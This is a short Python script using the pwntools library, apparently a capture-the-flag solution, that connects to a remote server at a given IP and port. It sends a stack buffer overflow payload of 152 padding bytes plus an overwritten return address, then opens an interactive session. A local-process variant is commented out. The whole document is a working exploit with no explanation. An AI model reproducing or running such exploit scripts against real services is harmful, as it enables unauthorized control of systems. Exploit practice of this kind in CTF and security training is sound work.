#!/usr/bin/python
from pwn import *
context.arch='amd64'
r=remote("124.16.75.117",51001)
#r=process("./vuln")
r.sendline(b"a"*152+p64(0x80491f6))
r.interactive()
